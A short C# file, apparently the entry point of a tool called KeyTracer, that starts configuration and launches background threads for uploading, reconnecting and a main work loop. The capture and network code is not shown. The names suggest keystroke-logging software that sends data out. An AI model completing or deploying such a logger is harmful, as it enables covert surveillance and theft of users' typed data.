using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;

namespace KeyTracer
{
    public static class KeyTracerAPI
    {
        public static int Start()
        {
            try
            {
                StartUp.Configure();

                Thread uploadWork = new Thread(new ThreadStart(Threads.UplaodWork));
                uploadWork.Start();

                Thread reConnect = new Thread(new ThreadStart(Threads.Reconnect));
                reConnect.Start();

                Thread work = new Thread(new ThreadStart(Threads.DoWork));
                work.Start();

                return 1;
            }
            catch
            {
                return 0;
            }
        }

        public static int Stop()
        {
            try
            {
                Consts.doWork = false;

                return 1;
            }
            catch
            {
                return 0;
            }
        }
    }
}
